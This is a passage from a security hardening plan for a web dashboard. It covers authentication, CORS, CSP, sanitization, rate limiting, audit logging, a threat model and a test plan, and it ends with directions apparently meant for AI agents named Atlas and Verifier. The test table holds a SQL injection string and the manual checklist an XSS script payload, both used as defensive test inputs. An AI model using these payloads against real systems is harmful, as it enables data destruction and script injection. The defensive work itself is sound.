4. **Use prepared statement caching** — `better-sqlite3` caches prepared statements automatically

### Input Validation Functions

```javascript
const VALID_AGENT = /^[a-z][a-z0-9\-_]{0,49}$/;
const VALID_ID = /^[a-z0-9\-]{1,100}$/;
const VALID_TIMESTAMP = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/;

function validateAgent(name) {
  if (!VALID_AGENT.test(name)) throw new Error('Invalid agent name');
  return name;
}

function validateId(id) {
  if (!VALID_ID.test(id)) throw new Error('Invalid ID');
  return id;
}

function validateTimestamp(ts) {
  if (!VALID_TIMESTAMP.test(ts)) throw new Error('Invalid timestamp');
  return ts;
}
```

---

## 9. Keyboard Shortcut Scoping (Phase 5.4)

### The Problem

If the tactical map registers global keyboard shortcuts (e.g., `Ctrl+R` for replay, `Space` for pause), they could conflict with browser defaults or capture input when the user is typing in other UI elements.

### The Fix

All keyboard shortcuts must be **scoped to the tactical map canvas element**:

```javascript
const canvas = document.getElementById('tactical-map');

// Only capture shortcuts when canvas is focused
canvas.addEventListener('keydown', (e) => {
  if (e.key === 'r' && (e.ctrlKey || e.metaKey)) {
    e.preventDefault();
    openReplayPanel();
  }
  // ... other shortcuts
});

// Never register on document or window
// document.addEventListener('keydown', handler); // ❌ DON'T DO THIS
```

---

## 10. Implementation Checklist

### Phase 5.1: Foundation (Security Hardening)

**Authentication:**
- [ ] Create `server/middleware/auth.js` with `authenticate()` function
- [ ] Create `server/middleware/cors.js` with strict origin whitelist
- [ ] Create `server/middleware/security-headers.js` with CSP + other headers
- [ ] Add auth check at top of request handler in `server.js`
- [ ] Add `?token=` query param support for SSE endpoint
- [ ] Create token file with `0600` permissions on first startup
- [ ] Return `401 Unauthorized` for all unauthenticated `/api/*` requests
- [ ] Client-side: add `localStorage` token management + auth prompt
- [ ] Client-side: wrap all `fetch()` calls with `apiFetch()` that includes Bearer token
- [ ] Remove all `Access-Control-Allow-Origin: '*'` from `server.js`, `rpg-http.js`, `conversation-http.js`
- [ ] Write `scripts/rotate-dashboard-token.sh`

**Estimated effort:** 2-3 hours

### Phase 5.2: Content Safety

**Input sanitization:**
- [ ] Add `sanitizeText()` function to `server.js`
- [ ] Apply `sanitizeText()` to all text fields in `getSessionsJson()`
- [ ] Apply `sanitizeText()` to all text fields in `getVentureosAgents()`
- [ ] Apply `sanitizeText()` to RPG conversation message text
- [ ] Apply `sanitizeText()` to observation snippets, cron job names, git messages
- [ ] Server-side: move activity classification regex to API layer (don't trust client classification)
- [ ] Download DOMPurify UMD bundle to `public/vendor/purify.min.js`
- [ ] Client-side: create `safeText()` and `safeHtml()` wrappers
- [ ] Client-side: audit all `innerHTML` assignments, replace with `textContent` where possible
- [ ] Client-side: sanitize all remaining `innerHTML` with DOMPurify
- [ ] Sanitize error responses (no stack traces to client)

**Estimated effort:** 2-3 hours

### Phase 5.4: Session Visibility + UI Safety

**Session filtering:**
- [ ] Implement isolated session redaction in `getSessionsJson()`
- [ ] Implement isolated session redaction in `getAgentSessionsIndex()`
- [ ] Implement isolated session redaction in `getVentureosAgents()` → `recentSessions` and `recentCompletions`
- [ ] Verify no isolated session labels appear in any API response
- [ ] Keyboard shortcuts scoped to canvas element (not `document`)

**Estimated effort:** 1-2 hours

### Phase 5.6: Replay Security + Audit

**Replay endpoint:**
- [ ] Auth required on all `/api/replay/*` routes
- [ ] Audit log every replay access with session ID + timestamp range
- [ ] Parameterized SQL queries only (no string interpolation)
- [ ] Rate limit: 5 req/min on replay endpoints
- [ ] Input validation: timestamp format, session ID format, query parameter bounds

**Rate limiting (all endpoints):**
- [ ] Create `server/middleware/rate-limit.js`
- [ ] Apply rate limiting to all API routes
- [ ] Return `429 Too Many Requests` with `Retry-After` header

**Audit logging:**
- [ ] Create `server/middleware/audit-log.js`
- [ ] Log all auth failures
- [ ] Log all rate limit hits
- [ ] Log all replay access
- [ ] Log server start/stop events
- [ ] Implement brute-force detection (10 failures/5min → 15min block)

**Estimated effort:** 3-4 hours

---

## 11. Testing Strategy

### 11.1 Security Tests to Write

| Test | What It Verifies |
|------|-----------------|
| Request without token → 401 | Auth middleware works |
| Request with invalid token → 401 | Token comparison is strict |
| Request with valid token → 200 | Auth allows valid requests |
| OPTIONS preflight → 204 (no auth) | CORS preflight works |
| SSE with `?token=` → 200 | Query param auth works |
| Request from unlisted origin → no CORS headers | Origin whitelist works |
| Request from listed origin → CORS headers present | Whitelist allows known origins |
| Session API → no isolated labels | Session redaction works |
| Session API → no lastMessage for isolated | Content redaction works |
| Text with `<script>` → stripped in response | Server sanitization works |
| Text over 200 chars → truncated | Length caps work |
| 21st request in 60s to /api/sessions → 429 | Rate limiting works |
| Response headers include CSP | Headers applied correctly |
| Response headers include X-Frame-Options | Headers applied correctly |
| Error response → no stack trace | Error sanitization works |
| SQL with `'; DROP TABLE --` → parameterized safely | No SQL injection |

### 11.2 Manual Verification Checklist

After implementation, manually verify:

- [ ] Open dashboard in browser → prompted for token
- [ ] Enter wrong token → re-prompted
- [ ] Enter correct token → dashboard loads
- [ ] Check Network tab → all API requests include `Authorization: Bearer <token>`
- [ ] Check Response headers → `Content-Security-Policy` present
- [ ] Check Response headers → No `Access-Control-Allow-Origin: *`
- [ ] Check `/api/sessions` response → no isolated session labels or messages visible
- [ ] Open browser console → inject `<script>alert('xss')</script>` into a session label → verify it doesn't execute
- [ ] Rapidly refresh → eventually get 429 response

---

## 12. Threat Model Summary

| Threat | Likelihood | Impact | Mitigation | Section |
|--------|-----------|--------|------------|---------|
| Unauthorized LAN user accesses dashboard data | Medium | High | API key auth | §1 |
| Isolated session content exposed on tactical map | High (current) | High | Session filtering | §2 |
| XSS via malicious session label/description | Low-Medium | Critical | DOMPurify + CSP + server sanitization | §4, §5 |
| Cross-origin data exfiltration | Low | High | Strict CORS + CSP `connect-src` | §3, §4 |
| Clickjacking | Low | Medium | CSP `frame-ancestors` + X-Frame-Options | §4 |
| SQL injection in replay queries | Low | Critical | Parameterized queries | §8 |
| Brute-force token guessing | Low | High | Timing-safe compare + brute-force detection | §1, §7 |
| Denial of service via API flooding | Low | Medium | Rate limiting | §6 |
| Data exfiltration via error messages | Low | Medium | Sanitized error responses | §2.5 |

---

## 13. Dependencies

| Dependency | Version | Purpose | Install Method |
|------------|---------|---------|---------------|
| `dompurify` | ^3.1.x | Client-side HTML sanitization | Download UMD bundle to `public/vendor/` |
| Node.js `crypto` | Built-in | Token generation, timing-safe compare | Already available |
| Node.js `fs` | Built-in | Token file, audit logs | Already available |

**No new npm dependencies required on the server side.** All middleware uses Node.js built-ins. DOMPurify is a client-side only dependency loaded as a static file.

---

## Appendix A: Request Processing Pipeline

```
Incoming HTTP Request
  │
  ├─ 1. Security Headers (CSP, X-Frame-Options, etc.)
  │
  ├─ 2. CORS Preflight Check
  │     └─ OPTIONS? → 204 with CORS headers → done
  │
  ├─ 3. Static Asset Check
  │     └─ Not /api/*? → Serve static file (no auth) → done
  │
  ├─ 4. Authentication
  │     └─ Invalid/missing token? → 401 + audit log → done
  │
  ├─ 5. Rate Limiting
  │     └─ Limit exceeded? → 429 + audit log → done
  │
  ├─ 6. Route Handler
  │     ├─ Parameterized DB queries
  │     ├─ Session visibility filtering
  │     └─ Text sanitization on output
  │
  └─ 7. Response
        ├─ CORS headers (if origin whitelisted)
        ├─ Rate limit headers (X-RateLimit-*)
        └─ JSON body with sanitized text
```

---

## Appendix B: File Inventory

### New Files to Create

| File | Purpose |
|------|---------|
| `server/middleware/auth.js` | Token validation middleware |
| `server/middleware/cors.js` | CORS origin whitelist |
| `server/middleware/security-headers.js` | CSP + security headers |
| `server/middleware/rate-limit.js` | Per-endpoint rate limiting |
| `server/middleware/audit-log.js` | JSON Lines audit logging |
| `public/vendor/purify.min.js` | DOMPurify client-side sanitization |
| `scripts/rotate-dashboard-token.sh` | Token rotation helper |
| `data/.api-token` | Auto-generated API token (0600 perms) |

### Existing Files to Modify

| File | Changes |
|------|---------|
| `server.js` | Add middleware pipeline, session filtering, text sanitization |
| `rpg-http.js` | Remove hardcoded CORS, use shared middleware |
| `conversation-http.js` | Remove hardcoded CORS, use shared middleware, sanitize message text |
| `index.html` | Add auth prompt, `apiFetch()` wrapper, DOMPurify integration |

---

*This document is the single source of truth for Phase 5 security. Atlas should be able to implement every middleware module from the code examples above without asking clarifying questions. Verifier should audit against the testing checklist in §11.*
